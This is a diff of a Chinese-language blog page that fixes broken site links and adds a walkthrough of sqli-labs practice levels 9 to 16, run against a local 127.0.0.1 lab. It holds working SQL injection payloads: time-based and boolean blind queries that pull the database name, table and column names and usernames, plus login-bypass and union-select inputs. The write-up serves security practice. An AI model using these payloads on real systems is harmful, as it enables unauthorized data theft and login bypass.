@@ -48,7 +48,7 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-  <link rel="shortcut icon" href="https://blank233.github.io/img/clover.png" type="image/x-icon" />
+  <link rel="shortcut icon" href="https://blank233.github.io//img/clover.png" type="image/x-icon" />
 
   
   
@@ -242,7 +242,7 @@
   <div>
     <i class="fa fa-folder fa-fw"></i>
     
-      <a class="post-taxonomy-topic" href="https://blank233.github.iotopics/web">web</a>
+      <a class="post-taxonomy-topic" href="https://blank233.github.io/topics/web">web</a>
     
   </div>
   
@@ -254,7 +254,7 @@
   <div>
     <i class="fa fa-tags fa-fw"></i>
     
-      <a class="post-taxonomy-tag" href="https://blank233.github.iotags/2018-03">2018-03</a>
+      <a class="post-taxonomy-tag" href="https://blank233.github.io/tags/2018-03">2018-03</a>
     
   </div>
   
@@ -543,7 +543,78 @@ ps:在win下，路径是\分隔，但是由于是在url中，\会被认定为转
 <pre><code>http://127.0.0.1/sql/Less-9/?id=1%27and%20if(ascii(mid(database(),1,1))=115,sleep(2),1)%23
 </code></pre>
 
-<p>如果数据库第一个字符的ascii值为115，就会sleep两秒，判断第二个字符更改mid函数的第二个参数即可</p>
+<p>如果数据库第一个字符的ascii值为115，就会sleep两秒，判断第二个字符更改mid函数的第二个参数即可，然后以此类推得到数据库名称。手注时，有一个前提就是知道数据库的长度 payload如下。</p>
+
+<pre><code>http://127.0.0.1/sql/Less-9/?id=1%27and%20if(length(database())=8,sleep(2),1)%23
+</code></pre>
+
+<p>然后是判断表名</p>
+
+<pre><code>http://127.0.0.1/sql/Less-9/?id=1%27and%20if(ascii(mid((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1))=101,sleep(2),1)%23
+</code></pre>
+
+<p>判断第一个表的第一个字符的ascii值是否位101，是就停顿2秒，判断第二个字符更改mid参数，判断其他表更改limit参数</p>
+
+<p>判断列名</p>
+
+<pre><code>http://127.0.0.1/sql/Less-9/?id=1%27and%20if(ascii(mid((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27emails%27%20limit%200,1),1,1))=105,sleep(2),1)%23
+</code></pre>
+
+<p>判断emails表的第一个列的第一个字符的ascii值是否为105，是就停顿2秒，判断第二个字符更改mid参数，判断其他表更改limit参数</p>
+
+<p>爆数据</p>
+
+<pre><code>http://127.0.0.1/sql/Less-9/?id=1%27and%20if(ascii(mid((select%20username%20from%20security.users%20limit%200,1),1,1))=68,sleep(2),1)%23
+</code></pre>
+
+<p>判断security.users里面username的第一个数据的第一个字符的ascii值是否为68</p>
+
+<h2 id="less-10">less-10</h2>
+
+<p>跟less-9没啥太大区别，就是改成了双引号闭合</p>
+
+<h2 id="less-11">less-11</h2>
+
+<p>到了less-11就是post注入了 可以先输入一个正确的username和password，比如Dumb和Dumb，可以看到页面返回正常并给出了你的用户名跟密码，然后可以试试万能密码admin&rsquo; or 1=1#密码任意输入，发现一样可以登陆，表示我们闭合前面的成功了 然后就可以在or 1=1的位置来进行我们的sql注入了</p>
+
+<p>还是先使用order by判断列数 admin&rsquo; order by 2#</p>
+
+<p>接下来就是使用联合查询慢慢注了 不在赘述 -admin&rsquo; union select 1,database()#</p>
+
+<h2 id="less-12">less-12</h2>
+
+<p>双引号+括号闭合 其他的跟11一样</p>
+
+<h2 id="less-13">less-13</h2>
+
+<p>还是先输入正确的账号跟密码 发现只是先是登陆成功 不在有其他回显</p>
+
+<p>输入admin’ 密码随便输 报错</p>
+
+<pre><code>Erreur de syntaxe près de '1') LIMIT 0,1' à la ligne 1
+</code></pre>
+
+<p>可以看到是&rsquo;)闭合  测试语句admin&rsquo;) and length(database())=8# 密码随便输入</p>
+
+<p>可以看到返回正常  说明数据库长度为8 测试语句 admin&rsquo;) and ascii(mid(database(),1,1))=115# 判断数据库第一个字符的ascii是否为115  其他可以参考less-5的布尔盲注，基本上一样</p>
+
+<h2 id="less-14">less-14</h2>
+
+<p>输入admin&rdquo; 密码为空 报错可以看到是双引号闭合  然后盲注</p>
+
+<h2 id="less-15">less-15</h2>
+
+<p>这一关注释了错误提示，看标题可以知道是时间盲注单引号闭合 测试语句 admin&rsquo; or 1=1# 密码随便输 成功登陆</p>
+
+<p>测试语句 admin&rsquo; and if(ascii(mid(database(),1,1))=115,sleep(2),1)#</p>
+
+<p>其他跟less-9差不多吧</p>
+
+<h2 id="less-16">less-16</h2>
+
+<p>与less-15的区别就在于闭合方式不同  这是双引号闭合</p>
+
+<h2 id="less-17">less-17</h2>
 
   
 <div class="prev-next-post pure-g">
@@ -584,7 +655,7 @@ ps:在win下，路径是\分隔，但是由于是在url中，\会被认定为转
 
 </div>
 </div>
-<script src="https://blank233.github.iojs/ui.js"></script>
+<script src="https://blank233.github.io/js/ui.js"></script>
 
 
 <script>
